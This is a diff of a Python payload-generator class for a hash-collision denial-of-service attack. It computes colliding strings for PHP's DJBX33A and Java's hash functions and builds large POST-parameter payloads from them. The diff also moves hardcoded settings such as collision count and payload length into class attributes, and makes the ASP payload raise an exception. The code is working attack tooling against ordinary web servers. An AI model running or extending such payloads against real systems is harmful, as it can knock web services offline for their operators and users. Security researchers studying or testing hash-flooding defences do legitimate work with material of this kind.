@@ -40,18 +40,25 @@ import random
 import itertools
 
 class Payloadgenerator:
+    # Number of colliding chars to find
+    _collisionchars = 5
+    # Length of the collision chars (2 = Ey, FZ; 3=HyA, ...)
+    _collisioncharlength = 2
+    # Length of each parameter in the payload
+    _payloadlength = 8
+    
     def generateASPPayload(self):
-        return "a=a"
+        raise Exception("ASP Payload not implemented")
     
     def generateJAVAPayload(self):
-        a = self._computeJAVACollisionChars(5)
-        return self._generatePayload(a, 8)
+        a = self._computeJAVACollisionChars(self._collisionchars)
+        return self._generatePayload(a, self._payloadlength)
     
     def generatePHPPayload(self):
         # Note: Default max POST Data Length in PHP is 8388608 bytes (8MB)
         # compute entries with collisions in PHP hashtable hash function 
-        a = self._computePHPCollisionChars(5)
-        return self._generatePayload(a, 8);
+        a = self._computePHPCollisionChars(self._collisionchars)
+        return self._generatePayload(a, self._payloadlength);
     
     def _computePHPCollisionChars(self, count):
         return self._computeCollisionChars(self._DJBX33A, count)
@@ -62,7 +69,7 @@ class Payloadgenerator:
     def _computeCollisionChars(self, function, count):
         hashes = {}
         counter = 0
-        length = 2
+        length = self._collisioncharlength
         a = ""
         for i in range(0, 256):
             a = a+chr(i)
